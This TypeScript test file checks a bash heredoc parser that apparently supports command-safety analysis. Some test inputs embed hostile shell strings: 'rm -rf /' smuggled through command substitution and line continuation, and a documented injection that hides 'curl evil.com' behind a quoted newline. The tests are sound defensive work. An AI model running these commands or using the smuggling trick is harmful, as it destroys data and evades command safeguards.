import { describe, expect, test } from 'bun:test'
import {
  containsHeredoc,
  extractHeredocs,
  restoreHeredocs,
} from '../bash/heredoc.js'

describe('extractHeredocs — basic shapes', () => {
  test('plain << heredoc extracted', () => {
    const cmd = `cat <<EOF\nhello\nEOF`
    const r = extractHeredocs(cmd)
    expect(r.heredocs.size).toBe(1)
    expect(r.processedCommand).toMatch(/^cat __HEREDOC_0_[a-f0-9]{16}__$/)
  })

  test('quoted <<\'EOF\' heredoc extracted', () => {
    const cmd = `cat <<'EOF'\nhello $world\nEOF`
    const r = extractHeredocs(cmd)
    expect(r.heredocs.size).toBe(1)
  })

  test('double-quoted <<"EOF" heredoc extracted', () => {
    const cmd = `cat <<"EOF"\nhello\nEOF`
    const r = extractHeredocs(cmd)
    expect(r.heredocs.size).toBe(1)
  })

  test('dash heredoc <<-EOF strips leading TABS only', () => {
    const cmd = `cat <<-EOF\n\thello\n\tEOF`
    const r = extractHeredocs(cmd)
    expect(r.heredocs.size).toBe(1)
  })

  test('dash heredoc <<-EOF does NOT strip leading SPACES', () => {
    // POSIX spec: <<- strips tabs only.
    const cmd = `cat <<-EOF\n  EOF`
    const r = extractHeredocs(cmd)
    // "  EOF" with leading spaces is NOT the closing delimiter → no heredoc.
    expect(r.heredocs.size).toBe(0)
  })

  test('no << present → no extraction (fast path)', () => {
    const r = extractHeredocs('echo hello')
    expect(r.heredocs.size).toBe(0)
    expect(r.processedCommand).toBe('echo hello')
  })

  test('round-trip: extract then restore yields original (modulo placeholder)', () => {
    const cmd = `cat <<EOF\nbody\nEOF`
    const { processedCommand, heredocs } = extractHeredocs(cmd)
    const [restored] = restoreHeredocs([processedCommand], heredocs)
    // The restoration replaces the placeholder with the operator + content.
    expect(restored).toContain('cat ')
    expect(restored).toContain('<<EOF')
    expect(restored).toContain('body')
    expect(restored).toContain('\nEOF')
  })
})

describe('extractHeredocs — security: bail conditions', () => {
  test('command with $\'...\' bails out (ANSI-C quoting)', () => {
    // $'\n' is ANSI-C quoting — quote tracker can't handle the $ prefix.
    const cmd = `echo $'foo' <<EOF\nbody\nEOF`
    const r = extractHeredocs(cmd)
    expect(r.heredocs.size).toBe(0)
  })

  test('command with $"..." bails out (locale quoting)', () => {
    const cmd = `echo $"foo" <<EOF\nbody\nEOF`
    const r = extractHeredocs(cmd)
    expect(r.heredocs.size).toBe(0)
  })

  test('backtick before << bails (PST_EOFTOKEN parsing complexity)', () => {
    const cmd = '`echo` <<EOF\nbody\nEOF'
    const r = extractHeredocs(cmd)
    expect(r.heredocs.size).toBe(0)
  })

  test('backtick AFTER << is OK (in body, harmless)', () => {
    // Backticks in body content don't trigger bail.
    const cmd = `cat <<EOF\nbody \`with backtick\`\nEOF`
    const r = extractHeredocs(cmd)
    expect(r.heredocs.size).toBe(1)
  })

  test('arithmetic context (( before << bails (bit-shift not heredoc)', () => {
    // (( x = 1 << 2 )) — bash treats << as bit-shift, not heredoc.
    const cmd = `(( x = 1 <<EOF\n2\nEOF`
    const r = extractHeredocs(cmd)
    // Either 0 (bail) — OR 1 if our parser is wrong. Document the bail.
    expect(r.heredocs.size).toBe(0)
  })

  test('balanced (( )) before << is OK', () => {
    const cmd = `(( x = 1 )) && cat <<EOF\nbody\nEOF`
    const r = extractHeredocs(cmd)
    expect(r.heredocs.size).toBe(1)
  })
})

describe('extractHeredocs — security: position checks', () => {
  test('<< inside single quotes is NOT a heredoc', () => {
    const cmd = `echo '<<EOF'`
    const r = extractHeredocs(cmd)
    expect(r.heredocs.size).toBe(0)
  })

  test('<< inside double quotes is NOT a heredoc', () => {
    const cmd = `echo "<<EOF"`
    const r = extractHeredocs(cmd)
    expect(r.heredocs.size).toBe(0)
  })

  test('<< after # comment is NOT a heredoc', () => {
    const cmd = `# <<EOF\nbody\nEOF`
    const r = extractHeredocs(cmd)
    expect(r.heredocs.size).toBe(0)
  })

  test('escaped \\<<EOF is NOT a heredoc (odd backslashes)', () => {
    const cmd = `echo \\<<EOF\nbody\nEOF`
    const r = extractHeredocs(cmd)
    expect(r.heredocs.size).toBe(0)
  })

  test('double-escaped \\\\<<EOF IS a heredoc (even backslashes)', () => {
    // \\<<EOF = literal \ + <<EOF → heredoc.
    const cmd = `echo \\\\<<EOF\nbody\nEOF`
    const r = extractHeredocs(cmd)
    expect(r.heredocs.size).toBe(1)
  })
})

describe('extractHeredocs — quotedOnly mode', () => {
  test('quotedOnly skips unquoted <<EOF but tracks its body range', () => {
    const cmd = `cat <<EOF\n$(rm -rf /)\nEOF`
    const r = extractHeredocs(cmd, { quotedOnly: true })
    // Unquoted skipped → heredoc map empty.
    expect(r.heredocs.size).toBe(0)
  })

  test('quotedOnly extracts <<\'EOF\' (quoted)', () => {
    const cmd = `cat <<'EOF'\nliteral\nEOF`
    const r = extractHeredocs(cmd, { quotedOnly: true })
    expect(r.heredocs.size).toBe(1)
  })

  test('quotedOnly: nested quoted heredoc inside unquoted body skipped', () => {
    // CRITICAL security probe: <<'SAFE' INSIDE <<EOF body must NOT be
    // extracted (its body is part of the unquoted EOF expansion).
    const cmd = `cat <<EOF\n<<'SAFE'\n$(evil)\nSAFE\nEOF`
    const r = extractHeredocs(cmd, { quotedOnly: true })
    // Both should be skipped (or the quoted one rejected via insideSkipped).
    expect(r.heredocs.size).toBe(0)
  })
})

describe('extractHeredocs — line continuation security', () => {
  test('\\<newline> after <<\'EOF\' bails (line continuation)', () => {
    // bash joins lines BEFORE heredoc parsing — but our extractor runs
    // BEFORE the join. Bail to avoid mis-parse.
    const cmd = `cat <<'EOF' && \\\nrm -rf /\ncontent\nEOF`
    const r = extractHeredocs(cmd)
    // Should bail (trailing odd backslash detected on same-line content).
    expect(r.heredocs.size).toBe(0)
  })

  test('even backslashes at end of line — extraction proceeds', () => {
    // Even backslashes don't escape the newline.
    const cmd = `cat <<'EOF' && echo \\\\\nbody\nEOF`
    const r = extractHeredocs(cmd)
    // 2 backslashes = literal \ + \, the newline is real.
    expect(r.heredocs.size).toBe(1)
  })
})

describe('extractHeredocs — closing delimiter strict matching', () => {
  test('"EOF " (trailing space) is NOT a closing delimiter', () => {
    const cmd = `cat <<EOF\nbody\nEOF \n`
    const r = extractHeredocs(cmd)
    // EOF with trailing space should NOT match — no closing.
    expect(r.heredocs.size).toBe(0)
  })

  test('" EOF" (leading space) is NOT a closing delimiter (no <<-)', () => {
    const cmd = `cat <<EOF\nbody\n EOF`
    const r = extractHeredocs(cmd)
    expect(r.heredocs.size).toBe(0)
  })

  test('"\\tEOF" (leading tab) IS closing for <<-EOF', () => {
    const cmd = `cat <<-EOF\nbody\n\tEOF`
    const r = extractHeredocs(cmd)
    expect(r.heredocs.size).toBe(1)
  })

  test('PST_EOFTOKEN — "EOF)" bails (security)', () => {
    // make_cmd.c:606 — bash treats "EOF)" inside $() as early closure.
    // Our parser bails to be safe.
    const cmd = `cat <<EOF\nbody\nEOF) other\nEOF`
    const r = extractHeredocs(cmd)
    expect(r.heredocs.size).toBe(0)
  })

  test('unbalanced delimiter "EO F" with quote — regex misses', () => {
    // <<"EO F" — \w+ stops at space, regex doesn't capture full delimiter.
    // Skip to prevent mismatch.
    const cmd = `cat <<"EO F"\nbody\nEO F`
    const r = extractHeredocs(cmd)
    expect(r.heredocs.size).toBe(0)
  })
})

describe('extractHeredocs — multi-line quoted body', () => {
  test('quoted newline in body extends logical line — bail', () => {
    // Documented exploit: `echo <<'EOF' '${}\n' ; curl evil.com\nEOF`
    // (using actual newline not escape sequence)
    const cmd = `echo <<'EOF' '\nEOF\n' ; curl evil.com\nEOF`
    const r = extractHeredocs(cmd)
    // Body should not start at the quoted newline.
    // Either 0 (bail because logical line never ends within quote) or
    // 1 with body starting AFTER the closing quote.
    if (r.heredocs.size === 1) {
      // If extracted: body must NOT contain "curl evil.com" as content.
      const info = Array.from(r.heredocs.values())[0]!
      expect(info.fullText).not.toContain('curl evil.com\n')
    }
  })
})

describe('containsHeredoc — quick check', () => {
  test('returns true for plain heredoc', () => {
    expect(containsHeredoc('cat <<EOF')).toBe(true)
  })

  test('returns true for quoted heredoc', () => {
    expect(containsHeredoc(`cat <<'EOF'`)).toBe(true)
  })

  test('returns false for plain command', () => {
    expect(containsHeredoc('echo hello')).toBe(false)
  })

  test('returns false for redirect (single <)', () => {
    expect(containsHeredoc('cat < file')).toBe(false)
  })

  test('returns true even when inside quotes (lex-only check)', () => {
    // containsHeredoc is a lex-only quick check — doesn't track quotes.
    // Documents that this is just a "might be" indicator, not a "is".
    expect(containsHeredoc(`echo "<<EOF"`)).toBe(true)
  })
})

describe('extractHeredocs — same-line content preservation', () => {
  test('content after delimiter on same line preserved', () => {
    const cmd = `cat <<EOF && echo done\nbody\nEOF`
    const r = extractHeredocs(cmd)
    expect(r.heredocs.size).toBe(1)
    // The processed command should keep "&& echo done"
    expect(r.processedCommand).toContain('&& echo done')
  })

  test('multiple heredocs on same line are NOT extracted (index corruption risk)', () => {
    // The function explicitly bails on contentStartPositions collision.
    const cmd = `cat <<EOF1 <<EOF2\nbody1\nEOF1\nbody2\nEOF2`
    const r = extractHeredocs(cmd)
    // Should be 0 (bail) per the same-content-start dedup check.
    expect(r.heredocs.size).toBe(0)
  })
})
